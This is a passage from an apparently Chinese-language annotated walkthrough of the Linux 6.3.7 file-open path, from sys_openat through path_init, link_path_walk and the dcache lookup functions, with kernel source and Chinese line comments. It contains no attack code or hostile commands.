i_devices; /* 设备列表 */ union &#123; struct pipe_inode_info *i_pipe; /* 管道 inode 信息 */ struct cdev *i_cdev; /* 字符设备 */ char *i_link; /* 符号链接的目标路径 */ unsigned i_dir_seq; /* 目录序列计数器 */ &#125;; __u32 i_generation; /* inode 生成计数器 */#ifdef CONFIG_FSNOTIFY __u32 i_fsnotify_mask; /* inode 关心的所有事件 */ struct fsnotify_mark_connector __rcu *i_fsnotify_marks; /* 文件系统通知标记连接器 */#endif#ifdef CONFIG_FS_ENCRYPTION struct fscrypt_info *i_crypt_info; /* 文件系统加密信息 */#endif#ifdef CONFIG_FS_VERITY struct fsverity_info *i_verity_info; /* 文件系统完整性信息 */#endif void *i_private; /* 文件系统或设备的私有指针 */&#125; __randomize_layout; 打开或者创建新文件open系统调用sys_openat identifier - Linux source code (v6.3.7) - Bootlin 12345678910111213141516171819202122// 定义一个名为 open 的系统调用，该调用接受三个参数：filename（文件名），flags（标志）和 mode（模式）SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode)&#123; // 如果需要处理大文件，将 O_LARGEFILE 标志添加到 flags 中 if (force_o_largefile()) flags |= O_LARGEFILE; // 调用 do_sys_open 函数，传入当前工作目录的文件描述符 AT_FDCWD、filename、flags 和 mode 参数 return do_sys_open(AT_FDCWD, filename, flags, mode);&#125;// 定义一个名为 openat 的系统调用，该调用接受四个参数：dfd（目录文件描述符），filename（文件名），flags（标志）和 mode（模式）SYSCALL_DEFINE4(openat, int, dfd, const char __user *, filename, int, flags, umode_t, mode)&#123; // 如果需要处理大文件，将 O_LARGEFILE 标志添加到 flags 中 if (force_o_largefile()) flags |= O_LARGEFILE; // 调用 do_sys_open 函数，传入 dfd（目录文件描述符）、filename、flags 和 mode 参数 return do_sys_open(dfd, filename, flags, mode);&#125; open - 这是一个较早版本的系统调用，它接受三个参数：filename，flags 和 mode。filename 参数是要打开或创建的文件名；flags 参数用于指定文件的打开方式，例如只读、只写或读写，以及其他一些选项，如创建新文件或截断文件；mode 参数用于指定新创建文件的权限。在处理大文件时，如果设置了 O_LARGEFILE 标志，open 会自动处理大文件。 openat - 与 open 类似，但多了一个参数 dfd（目录文件描述符）。这个系统调用支持从一个特定的目录开始解析相对路径。如果 dfd 是一个有效的目录文件描述符，那么 filename 参数将被解析为该目录下的相对路径。如果 dfd 是 AT_FDCWD，则 filename 会被视为当前工作目录下的相对路径。这个系统调用在处理多线程程序和文件系统命名空间时非常有用。 do_sys_open函数do_sys_open identifier - Linux source code (v6.3.7) - Bootlin 123456789// 定义一个名为 do_sys_open 的函数，该函数接受四个参数：dfd（目录文件描述符），filename（文件名），flags（标志）和 mode（模式）long do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)&#123; // 使用 build_open_how 函数根据 flags 和 mode 参数构造一个 open_how 结构体 struct open_how how = build_open_how(flags, mode); // 调用 do_sys_openat2 函数，传入 dfd（目录文件描述符）、filename 和 how 结构体的指针 return do_sys_openat2(dfd, filename, &amp;how);&#125; do_sys_openat2函数do_sys_openat2 identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142// 定义一个名为 do_sys_openat2 的静态函数，该函数接受三个参数：dfd（目录文件描述符），filename（文件名）和 how（打开方式结构体指针）static long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how)&#123; struct open_flags op; // 使用 build_open_flags 函数根据 how 结构体构造一个 open_flags 结构体，将结果存储在 op 变量中 int fd = build_open_flags(how, &amp;op); struct filename *tmp; // 如果 fd 不为 0（表示出错），则返回 fd if (fd) return fd; // 使用 getname 函数获取 filename 参数的内核空间副本，并将其存储在 tmp 变量中 tmp = getname(filename); // 如果获取文件名出错，返回错误码 if (IS_ERR(tmp)) return PTR_ERR(tmp); // 根据 how-&gt;flags 获取未使用的文件描述符（fd），并将其存储在 fd 变量中 fd = get_unused_fd_flags(how-&gt;flags); // 如果 fd 大于等于 0（表示未使用的文件描述符可用） if (fd &gt;= 0) &#123; // 使用 do_filp_open 函数打开文件，传入 dfd（目录文件描述符）、tmp（文件名）和 op（打开方式）参数 struct file *f = do_filp_open(dfd, tmp, &amp;op); // 如果打开文件出错，释放未使用的文件描述符并返回错误码 if (IS_ERR(f)) &#123; put_unused_fd(fd); fd = PTR_ERR(f); &#125; else &#123; // 如果打开文件成功，调用 fsnotify_open 函数通知相关子系统 fsnotify_open(f); // 调用 fd_install 函数将文件描述符 fd 与打开的文件结构体 f 关联起来 fd_install(fd, f); &#125; &#125; // 释放 tmp 变量（即 filename 的内核空间副本） putname(tmp); // 返回文件描述符 fd return fd;&#125; do_filp_open函数do_filp_open identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324// 定义一个名为 do_filp_open 的函数，该函数接受三个参数：dfd（目录文件描述符），pathname（文件名结构体指针）和 op（打开方式结构体指针）struct file *do_filp_open(int dfd, struct filename *pathname, const struct open_flags *op)&#123; struct nameidata nd; // 从 op 结构体中获取查找标志 int flags = op-&gt;lookup_flags; struct file *filp; // 使用 set_nameidata 函数初始化 nd 结构体，传入 dfd（目录文件描述符）、pathname（文件名结构体指针）和 NULL set_nameidata(&amp;nd, dfd, pathname, NULL); // 使用 path_openat 函数尝试打开文件，传入 nd（名字数据结构体）、op（打开方式结构体）和 flags（查找标志）；使用 LOOKUP_RCU 标志进行 RCU 优化 filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 如果文件打开失败并返回 -ECHILD 错误码，表明 RCU 优化失败，尝试使用非 RCU 优化方式打开文件 if (unlikely(filp == ERR_PTR(-ECHILD))) filp = path_openat(&amp;nd, op, flags); // 如果文件打开失败并返回 -ESTALE 错误码，表明文件系统状态陈旧，尝试使用 LOOKUP_REVAL 标志重新评估文件系统状态并打开文件 if (unlikely(filp == ERR_PTR(-ESTALE))) filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 通过调用 restore_nameidata 函数恢复名字数据结构体（nd）的状态 restore_nameidata(); // 返回文件结构体指针 filp return filp;&#125; 12345678910static inline void set_nameidata(struct nameidata *p, int dfd, struct filename *name, const struct path *root)&#123; __set_nameidata(p, dfd, name); p-&gt;state = 0; if (unlikely(root)) &#123; p-&gt;state = ND_ROOT_PRESET; p-&gt;root = *root; &#125;&#125; 12345678910111213static void __set_nameidata(struct nameidata *p, int dfd, struct filename *name)&#123; struct nameidata *old = current-&gt;nameidata; p-&gt;stack = p-&gt;internal; p-&gt;depth = 0; p-&gt;dfd = dfd; p-&gt;name = name; p-&gt;path.mnt = NULL; p-&gt;path.dentry = NULL; p-&gt;total_link_count = old ? old-&gt;total_link_count : 0; p-&gt;saved = old; current-&gt;nameidata = p;&#125; path_openat函数path_openat identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 定义一个名为 path_openat 的静态函数，该函数接受三个参数：nd（名字数据结构体指针）、op（打开方式结构体指针）和 flags（打开标志）static struct file *path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)&#123; struct file *file; int error; // 使用 alloc_empty_file 函数分配一个空的文件结构体，传入打开标志和当前进程的认证信息 file = alloc_empty_file(op-&gt;open_flag, current_cred()); // 如果分配文件结构体失败，返回错误指针 if (IS_ERR(file)) return file; // 如果文件打开标志包含 __O_TMPFILE，调用 do_tmpfile 函数处理临时文件的打开操作 if (unlikely(file-&gt;f_flags &amp; __O_TMPFILE)) &#123; error = do_tmpfile(nd, flags, op, file); // 如果文件打开标志包含 O_PATH，调用 do_o_path 函数处理 O_PATH 标志的打开操作 &#125; else if (unlikely(file-&gt;f_flags &amp; O_PATH)) &#123; error = do_o_path(nd, flags, file); // 否则，正常处理文件打开操作 &#125; else &#123; // 使用 path_init 函数初始化 nd 结构体，并返回路径名字符串 s const char *s = path_init(nd, flags); // 循环调用 link_path_walk 和 open_last_lookups 函数，直到路径名解析完成 while (!(error = link_path_walk(s, nd)) &amp;&amp; (s = open_last_lookups(nd, file, op)) != NULL) ; // 路径名解析完成后，调用 do_open 函数处理文件打开操作 if (!error) error = do_open(nd, file, op); // 调用 terminate_walk 函数终止路径名解析操作 terminate_walk(nd); &#125; // 如果没有错误发生，返回文件结构体指针 if (likely(!error)) &#123; if (likely(file-&gt;f_mode &amp; FMODE_OPENED)) return file; WARN_ON(1); error = -EINVAL; &#125; // 如果有错误发生，释放文件结构体并返回错误指针 fput(file); // 如果错误码为 -EOPENSTALE，根据 flags 参数设置错误码为 -ECHILD 或 -ESTALE if (error == -EOPENSTALE) &#123; if (flags &amp; LOOKUP_RCU) error = -ECHILD; else error = -ESTALE; &#125; return ERR_PTR(error);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107/* 必须和 terminate_walk() 配对使用 */static const char *path_init(struct nameidata *nd, unsigned flags)&#123; int error; const char *s = nd-&gt;name-&gt;name; /* LOOKUP_CACHED 需要 RCU，要求调用者重试 */ if ((flags &amp; (LOOKUP_RCU | LOOKUP_CACHED)) == LOOKUP_CACHED) return ERR_PTR(-EAGAIN); if (!*s) flags &amp;= ~LOOKUP_RCU; if (flags &amp; LOOKUP_RCU) rcu_read_lock(); // 如果使用 RCU，则加锁 else nd-&gt;seq = nd-&gt;next_seq = 0; // 否则，将序列号设置为 0 nd-&gt;flags = flags; // 设置 nameidata 结构体的 flags nd-&gt;state |= ND_JUMPED; // 设置 nameidata 结构体的状态 // 读取 mount_lock 和 rename_lock 的序列号 nd-&gt;m_seq = __read_seqcount_begin(&amp;mount_lock.seqcount); nd-&gt;r_seq = __read_seqcount_begin(&amp;rename_lock.seqcount); smp_rmb(); // 检查是否预先设置了根路径 if (nd-&gt;state &amp; ND_ROOT_PRESET) &#123; struct dentry *root = nd-&gt;root.dentry; struct inode *inode = root-&gt;d_inode; if (*s &amp;&amp; unlikely(!d_can_lookup(root))) return ERR_PTR(-ENOTDIR); nd-&gt;path = nd-&gt;root; // 将预设的根路径设置为当前路径 nd-&gt;inode = inode; // 设置路径的 inode if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); nd-&gt;root_seq = nd-&gt;seq; &#125; else &#123; path_get(&amp;nd-&gt;path); &#125; return s; &#125; nd-&gt;root.mnt = NULL; // 绝对路径 - 获取根路径（LOOKUP_IN_ROOT 使用 nd-&gt;dfd） if (*s == &#x27;/&#x27; &amp;&amp; !(flags &amp; LOOKUP_IN_ROOT)) &#123; error = nd_jump_root(nd); // 从根路径开始查找 if (unlikely(error)) return ERR_PTR(error); return s; &#125; // 相对路径 - 获取相对路径的起始点 if (nd-&gt;dfd == AT_FDCWD) &#123; if (flags &amp; LOOKUP_RCU) &#123; struct fs_struct *fs = current-&gt;fs; unsigned seq; // 根据 fs_struct 获取 pwd（当前工作目录） do &#123; seq = read_seqcount_begin(&amp;fs-&gt;seq); nd-&gt;path = fs-&gt;pwd; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = __read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; while (read_seqcount_retry(&amp;fs-&gt;seq, seq)); &#125; else &#123; get_fs_pwd(current-&gt;fs, &amp;nd-&gt;path); // 获取当前进程的工作目录 nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; &#125; else &#123; // 调用者必须检查起始路径组件的执行权限 struct fd f = fdget_raw(nd-&gt;dfd); // 根据文件描述符获取 fd 结构 struct dentry *dentry; if (!f.file) return ERR_PTR(-EBADF); dentry = f.file-&gt;f_path.dentry; if (*s &amp;&amp; unlikely(!d_can_lookup(dentry))) &#123; fdput(f); return ERR_PTR(-ENOTDIR); &#125; nd-&gt;path = f.file-&gt;f_path; // 设置当前路径 if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; nd-&gt;seq = read_seqcount_begin(&amp;nd-&gt;path.dentry-&gt;d_seq); &#125; else &#123; path_get(&amp;nd-&gt;path); nd-&gt;inode = nd-&gt;path.dentry-&gt;d_inode; &#125; fdput(f); // 释放文件描述符 &#125; // 对于受限制的查找，我们需要将 dirfd 也设置为根路径 if (flags &amp; LOOKUP_IS_SCOPED) &#123; nd-&gt;root = nd-&gt;path; if (flags &amp; LOOKUP_RCU) &#123; nd-&gt;root_seq = nd-&gt;seq; &#125; else &#123; path_get(&amp;nd-&gt;root); nd-&gt;state |= ND_ROOT_GRABBED; &#125; &#125; return s;&#125; link_path_walk函数link_path_walk identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123static int link_path_walk(const char *name, struct nameidata *nd)&#123; int depth = 0; // 初始化深度为 0，用于记录符号链接的嵌套层数 int err; // 初始化 nd-&gt;last_type 和 nd-&gt;flags nd-&gt;last_type = LAST_ROOT; // 设置 nd-&gt;last_type 为 LAST_ROOT nd-&gt;flags |= LOOKUP_PARENT; // 更新 nd-&gt;flags，添加 LOOKUP_PARENT 标志 // 如果路径名是错误的，返回错误值 if (IS_ERR(name)) // 检查路径名是否有效（不是错误指针） return PTR_ERR(name); // 如果无效，返回错误值 // 跳过路径名开头的 &#x27;/&#x27; while (*name == &#x27;/&#x27;) // 当路径名以 &#x27;/&#x27; 开头时，进入循环 name++; // 将 name 指针向后移动一位，跳过 &#x27;/&#x27; // 如果路径名为空，返回 0 if (!*name) &#123; // 检查路径名是否为空（在跳过开头的 &#x27;/&#x27; 之后） nd-&gt;dir_mode = 0; // 将 nd-&gt;dir_mode 设置为 0 return 0; // 返回 0，表示路径查找结束 &#125; // 开始循环处理路径名的每个组件 for (;;) &#123; // 无限循环，直到路径名的所有组件都被处理 struct mnt_idmap *idmap; const char *link; u64 hash_len; int type; // 获取文件系统 ID 映射,文件系统 ID 映射用于将 VFS 中的用户和组 ID 转换为底层文件系统中的用户和组 ID。 idmap = mnt_idmap(nd-&gt;path.mnt); // 获取 nd-&gt;path.mnt 对应的文件系统 ID 映射 // 检查是否有权限执行查找操作 err = may_lookup(idmap, nd); // 检查当前用户是否有权限查找 if (err) // 如果没有权限 return err; // 返回错误值 // 计算当前路径组件的哈希值和长度,这些值将用于在散列查找中快速比较路径名组件。 hash_len = hash_name(nd-&gt;path.dentry, name); // 计算哈希值和长度 // 判断当前路径组件的类型（&#x27;.&#x27;、&#x27;..&#x27; 或普通组件） type = LAST_NORM; // 默认为普通组件 if (name[0] == &#x27;.&#x27;) switch (hashlen_len(hash_len)) &#123; // 如果组件以 &#x27;.&#x27; 开头，检查长度 case 2: if (name[1] == &#x27;.&#x27;) &#123; // 如果组件为 &quot;..&quot; type = LAST_DOTDOT; // 设置类型为 LAST_DOTDOT nd-&gt;state |= ND_JUMPED; // 更新 nd-&gt;state，添。这个标志表示我们正跳转到父目录。 &#125; break; case 1: type = LAST_DOT; // 如果组件为 &quot;.&quot;，设置类型为 LAST_DOT &#125; if (likely(type == LAST_NORM)) &#123; // 如果组件类型为普通组件 struct dentry *parent = nd-&gt;path.dentry; // 获取当前组件的父目录 nd-&gt;state &amp;= ~ND_JUMPED; // 清除 nd-&gt;state 的 ND_JUMPED 标志 // 如果需要，执行自定义哈希操作。某些文件系统可能需要自定义哈希操作以适应其特定的查找机制。 if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_HASH)) &#123; // 检查父目录是否需要自定义哈希操作 struct qstr this = &#123; &#123; .hash_len = hash_len &#125;, .name = name &#125;; // 初始化 qstr 结构体 err = parent-&gt;d_op-&gt;d_hash(parent, &amp;this); // 执行自定义哈希操作 if (err &lt; 0) // 如果操作失败 return err; // 返回错误值 hash_len = this.hash_len; // 更新哈希值和长度 name = this.name; // 更新 name 指针 &#125; &#125; //--------------------------------------------------------------------- // 更新 nd 的 last 和 last_type 成员 nd-&gt;last.hash_len = hash_len; // 设置 nd-&gt;last 的哈希值和长度 nd-&gt;last.name = name; // 设置 nd-&gt;last 的名称 nd-&gt;last_type = type; // 设置 nd-&gt;last_type 为当前组件的类型 // 将 name 指针向后移动到下一个路径组件 name += hashlen_len(hash_len); // 将 name 指针向后移动到下一个路径组件的起始位置 // 如果到达路径名的结尾，处理结束 if (!*name) // 检查是否到达路径名的结尾 goto OK; // 跳转到 OK 标签 // 跳过连续的 &#x27;/&#x27; do &#123; name++; // 将 name 指针向后移动一位 &#125; while (unlikely(*name == &#x27;/&#x27;)); // 当遇到 &#x27;/&#x27; 时，继续循环 // 如果到达路径名的结尾，处理结束 if (unlikely(!*name)) &#123; // 再次检查是否到达路径名的结尾OK: // pathname or trailing symlink, done if (!depth) &#123; // 如果当前处理的路径组件不是符号链接的一部分 nd-&gt;dir_vfsuid = i_uid_into_vfsuid(idmap, nd-&gt;inode); // 设置 nd-&gt;dir_vfsuid nd-&gt;dir_mode = nd-&gt;inode-&gt;i_mode; // 设置 nd-&gt;dir_mode nd-&gt;flags &amp;= ~LOOKUP_PARENT; // 清除 nd-&gt;flags 的 LOOKUP_PARENT 标志 return 0; // 返回 0，表示路径查找结束 &#125; // last component of nested symlink name = nd-&gt;stack[--depth].name; // 获取符号链接栈中下一个组件的名称 link = walk_component(nd, 0); // 处理当前组件 &#125; else &#123; // not the last component link = walk_component(nd, WALK_MORE); // 处理当前组件，传递 WALK_MORE 标志 &#125; // 如果 link 不为空，表示需要处理符号链接 if (unlikely(link)) &#123; // 检查 link 是否为空 if (IS_ERR(link)) // 如果 link 是错误指针 return PTR_ERR(link); // 返回错误值 // a symlink to follow nd-&gt;stack[depth++].name = name; // 将当前组件的名称压入符号链接栈 name = link; // 将 name 指针设置为符号链接的目标路径 continue; // 继续循环处理符号链接的目标路径 &#125; // 检查 dentry 是否可以执行查找操作 if (unlikely(!d_can_lookup(nd-&gt;path.dentry))) &#123; // 如果不能执行查找操作 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果 nd-&gt;flags 中包含 LOOKUP_RCU 标志 if (!try_to_unlazy(nd)) // 尝试取消对 nd 的懒加载 return -ECHILD; // 如果取消失败，返回 -ECHILD 错误值 &#125; return -ENOTDIR; // 返回 -ENOTDIR 错误值，表示不是目录 &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738/* * 计算路径组件的长度和哈希值， * 并将 &quot;hash_len&quot; 作为结果返回。 */static inline u64 hash_name(const void *salt, const char *name)&#123; unsigned long a = 0, b, x = 0, y = (unsigned long)salt; unsigned long adata, bdata, mask, len; const struct word_at_a_time constants = WORD_AT_A_TIME_CONSTANTS; // 初始化长度为 0 len = 0; goto inside; do &#123; // 对 a, x, y 进行哈希混合 HASH_MIX(x, y, a); // 更新名称长度 len += sizeof(unsigned long);inside: // 在给定偏移量的名称字符串中加载一个未对齐的值 a = load_unaligned_zeropad(name+len); // 通过 XOR 操作找到与斜线字符不同的部分,循环找到 b = a ^ REPEAT_BYTE(&#x27;/&#x27;); // 检查 a 和 b 中是否有零字节 &#125; while (!(has_zero(a, &amp;adata, &amp;constants) | has_zero(b, &amp;bdata, &amp;constants))); // 为 a 和 b 准备零掩码 adata = prep_zero_mask(a, adata, &amp;constants); bdata = prep_zero_mask(b, bdata, &amp;constants); // 通过组合 a 和 b 的零掩码创建最终的零掩码 mask = create_zero_mask(adata | bdata); // 将 a 的零掩码应用于 x x ^= a &amp; zero_bytemask(mask); // 根据 x, y 和零掩码创建最终的哈希长度值 return hashlen_create(fold_hash(x, y), len + find_zero(mask));&#125; walk_component函数walk_component identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536// 定义一个名为 walk_component 的函数，参数包括一个指向 nameidata 结构体的指针和一个整数 flagsstatic const char *walk_component(struct nameidata *nd, int flags)&#123; // 定义一个指向 dentry 结构体的指针 struct dentry *dentry; /* * &quot;.&quot; 和 &quot;..&quot; 是特殊的 - 尤其是 &quot;..&quot;，因为它必须知道当前根目录和 * 父目录之间的关系。 */ // 如果 nd-&gt;last_type 不是 LAST_NORM，则执行以下代码 if (unlikely(nd-&gt;last_type != LAST_NORM)) &#123; // 如果 flags 没有设置 WALK_MORE 且 nd-&gt;depth 不为 0，则调用 put_link 函数 if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); // 调用 handle_dots 函数处理 &quot;.&quot; 和 &quot;..&quot; return handle_dots(nd, nd-&gt;last_type); &#125; // 调用 lookup_fast 函数进行快速查找 dentry = lookup_fast(nd); // 如果 dentry 是一个错误指针，则返回错误指针 if (IS_ERR(dentry)) return ERR_CAST(dentry); // 如果 dentry 为 NULL，则执行以下代码 if (unlikely(!dentry)) &#123; // 调用 lookup_slow 函数进行慢速查找 dentry = lookup_slow(&amp;nd-&gt;last, nd-&gt;path.dentry, nd-&gt;flags); // 如果 dentry 是一个错误指针，则返回错误指针 if (IS_ERR(dentry)) return ERR_CAST(dentry); &#125; // 如果 flags 没有设置 WALK_MORE 且 nd-&gt;depth 不为 0，则调用 put_link 函数 if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) put_link(nd); // 调用 step_into 函数进入下一个组件（目录或文件） return step_into(nd, flags, dentry);&#125; 1234567static inline void put_link(struct nameidata *nd)&#123; struct saved *last = nd-&gt;stack + --nd-&gt;depth; do_delayed_call(&amp;last-&gt;done); if (!(nd-&gt;flags &amp; LOOKUP_RCU)) path_put(&amp;last-&gt;link);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 定义一个函数handle_dots，用于处理路径名中的点（.）和点点（..）static const char *handle_dots(struct nameidata *nd, int type) &#123; // 如果当前路径组件是两个点（..） if (type == LAST_DOTDOT) &#123; // 定义错误指针并初始化为NULL const char *error = NULL; // 定义一个dentry结构的父目录指针 struct dentry *parent; // 如果nd（nameidata结构）的root成员为空 if (!nd-&gt;root.mnt) &#123; // 调用set_root函数设置nd的根目录，并检查是否出现错误 error = ERR_PTR(set_root(nd)); if (error) return error; &#125; // 如果nd的flags中包含LOOKUP_RCU标志 if (nd-&gt;flags &amp; LOOKUP_RCU) // 调用follow_dotdot_rcu函数，以RCU方式处理两个点（..） parent = follow_dotdot_rcu(nd); else // 否则，调用follow_dotdot函数处理两个点（..） parent = follow_dotdot(nd); // 如果parent是一个错误指针，返回错误 if (IS_ERR(parent)) return ERR_CAST(parent); // 调用step_into函数进入parent目录，不跟随符号链接 error = step_into(nd, WALK_NOFOLLOW, parent); // 如果出现错误，返回错误 if (unlikely(error)) return error; // 如果nd的flags中包含LOOKUP_IS_SCOPED标志 if (unlikely(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) &#123; /* * 如果我们的路径在进行重命名或挂载操作期间发生竞争， * 那么我们无法确定&quot;..&quot;是否跳过了nd-&gt;root（因此用户空间应该重试或使用一些回退方法）。 */ // 读取内存屏障，确保正确的内存顺序 smp_rmb(); // 如果mount_lock的序列计数器发生变化，返回错误EAGAIN if (__read_seqcount_retry(&amp;mount_lock.seqcount, nd-&gt;m_seq)) return ERR_PTR(-EAGAIN); // 如果rename_lock的序列计数器发生变化，返回错误EAGAIN if (__read_seqcount_retry(&amp;rename_lock.seqcount, nd-&gt;r_seq)) return ERR_PTR(-EAGAIN); &#125; &#125; // 如果不是两个点（..），返回NULL return NULL;&#125; lookup_fast函数lookup_fast identifier - Linux source code (v6.3.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647static struct dentry *lookup_fast(struct nameidata *nd)&#123; struct dentry *dentry, *parent = nd-&gt;path.dentry; // 定义dentry指针，将nd中的path的dentry赋值给parent int status = 1; /* * Rename seqlock is not required here because in the off chance * of a false negative due to a concurrent rename, the caller is * going to fall back to non-racy lookup. */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果使用RCU（读-拷贝-更新）查找 dentry = __d_lookup_rcu(parent, &amp;nd-&gt;last, &amp;nd-&gt;next_seq); // 用RCU方式查找目录项 if (unlikely(!dentry)) &#123; // 如果没有找到dentry if (!try_to_unlazy(nd)) // 尝试将rcu锁升级为非rcu锁 return ERR_PTR(-ECHILD); // 返回错误 return NULL; // 返回空指针 &#125; /* * This sequence count validates that the parent had no * changes while we did the lookup of the dentry above. */ if (read_seqcount_retry(&amp;parent-&gt;d_seq, nd-&gt;seq)) // 验证在查找dentry过程中parent没有发生变化 return ERR_PTR(-ECHILD); // 返回错误 status = d_revalidate(dentry, nd-&gt;flags); // 验证dentry的有效性 if (likely(status &gt; 0)) // 如果验证成功 return dentry; // 返回dentry if (!try_to_unlazy_next(nd, dentry)) // 尝试将rcu锁升级为非rcu锁 return ERR_PTR(-ECHILD); // 返回错误 if (status == -ECHILD) /* we&#x27;d been told to redo it in non-rcu mode */ status = d_revalidate(dentry, nd-&gt;flags); // 在非RCU模式下重新验证dentry的有效性 &#125; else &#123; // 如果使用非RCU查找 dentry = __d_lookup(parent, &amp;nd-&gt;last); // 查找目录项 if (unlikely(!dentry)) // 如果没有找到dentry return NULL; // 返回空指针 status = d_revalidate(dentry, nd-&gt;flags); // 验证dentry的有效性 &#125; if (unlikely(status &lt;= 0)) &#123; // 如果验证失败 if (!status) // 如果status为0 d_invalidate(dentry); // 使dentry无效 dput(dentry); // 释放dentry引用 return ERR_PTR(status); // 返回错误 &#125; return dentry; // 返回dentry&#125; Linux 为了提高目录项对象的处理效率，设计与实现了目录项高速缓存 dentry cache，简称 dcache，在上节中已有详细描述。lookup_fast()会在dcache中去试图找到该对应的dentry，实际最终会调用https://code.woboq.org/linux/linux/include/linux/rculist_bl.h.html#123轮询列表进行查找。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * __d_lookup - 搜索一个 dentry (容易出现竞争) * @parent: 父 dentry * @name: 我们希望找到的名字的 qstr * 返回: dentry，或者 NULL * * __d_lookup 类似于 d_lookup，但是由于与重命名无关的活动，它可能（很少）返回 * 一个错误的负面结果。 * * __d_lookup 通过避免读取 rename_lock seqlock，速度稍快， * 但必须谨慎使用，例如在失败时使用后续的 d_lookup。 * * __d_lookup 调用者必须加注释。 */struct dentry *__d_lookup(const struct dentry *parent, const struct qstr *name)&#123; unsigned int hash = name-&gt;hash; // 计算 name 的哈希值 struct hlist_bl_head *b = d_hash(hash); // 获取哈希值对应的哈希表头 struct hlist_bl_node *node; // 用于遍历哈希链表的节点 struct dentry *found = NULL; // 用于存储找到的 dentry struct dentry *dentry; // 用于遍历哈希链表的临时 dentry /* * 注意：这里与 __d_lookup_rcu 有很大的重复部分，这是为了防止单线程性能 * 回归，特别是在 smp_rmb（在 seqcounts 中）代价高昂的架构上。 * 保持这两个函数同步更新。 */ /* * 哈希列表使用 RCU 保护。 * * 在比较候选 dentry 时，获取 d_lock 以避免与 d_move() 的竞争。 * * 有可能并发的重命名操作会破坏我们这里的列表遍历，导致我们错过 dentry， * 从而产生错误的负面结果。d_lookup() 使用 rename_lock seqlock 来保护 * 并发重命名。 * * 更多细节请参阅 Documentation/filesystems/path-lookup.txt。 */ rcu_read_lock(); // 获取 RCU 读锁 // 遍历哈希链表 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; if (dentry-&gt;d_name.hash != hash) // 哈希值不匹配，继续下一个 continue; spin_lock(&amp;dentry-&gt;d_lock); // 获取 dentry 的自旋锁 if (dentry-&gt;d_parent != parent) // 父 dentry 不匹配，跳到下一个 goto next; if (d_unhashed(dentry)) // 检查 dentry 是否已从哈希表中移除，如果是则跳到下一个 goto next; if (!d_same_name(dentry, parent, name)) // 名字不匹配，跳到下一个 goto next; dentry-&gt;d_lockref.count++; // 增加 dentry 的引用计数 found = dentry; // 找到匹配的 dentry，赋值给 found spin_unlock(&amp;dentry-&gt;d_lock); // 释放 dentry 的自旋锁 break; // 结束循环 next: spin_unlock(&amp;dentry-&gt;d_lock); // 释放 dentry 的自旋锁 &#125; rcu_read_unlock(); // 释放 RCU 读锁 return found; // 返回找到的 dentry，如果没有找到返回 NULL&#125; __d_lookup_rcu函数__d_lookup_rcu identifier - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869struct dentry *__d_lookup_rcu(const struct dentry *parent, const struct qstr *name, unsigned *seqp)&#123; u64 hashlen = name-&gt;hash_len; // 计算名称的哈希长度 const unsigned char *str = name-&gt;name; // 获取名称字符串 struct hlist_bl_head *b = d_hash(hashlen_hash(hashlen)); // 计算哈希值并获取散列表头 struct hlist_bl_node *node; // 定义哈希表节点指针 struct dentry *dentry; // 定义目录项指针 /* * Note: There is significant duplication with __d_lookup_rcu which is * required to prevent single threaded performance regressions * especially on architectures where smp_rmb (in seqcounts) are costly. * Keep the two functions in sync. */ // 检查父目录项是否包含自定义比较函数，如果有则调用特定的查找函数 if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_COMPARE)) return __d_lookup_rcu_op_compare(parent, name, seqp); /* * The hash list is protected using RCU. * * Carefully use d_seq when comparing a candidate dentry, to avoid * races with d_move(). * * It is possible that concurrent renames can mess up our list * walk here and result in missing our dentry, resulting in the * false-negative result. d_lookup() protects against concurrent * renames using rename_lock seqlock. * * See Documentation/filesystems/path-lookup.txt for more details. */ // 使用 RCU 保护的哈希列表来遍历目录项 hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; unsigned seq; /* * The dentry sequence count protects us from concurrent * renames, and thus protects parent and name fields. * * The caller must perform a seqcount check in order * to do anything useful with the returned dentry. * * NOTE! We do a &quot;raw&quot; seqcount_begin here. That means that * we don&#x27;t wait for the sequence count to stabilize if it * is in the middle of a sequence change. If we do the slow * dentry compare, we will do seqretries until it is stable, * and if we end up with a successful 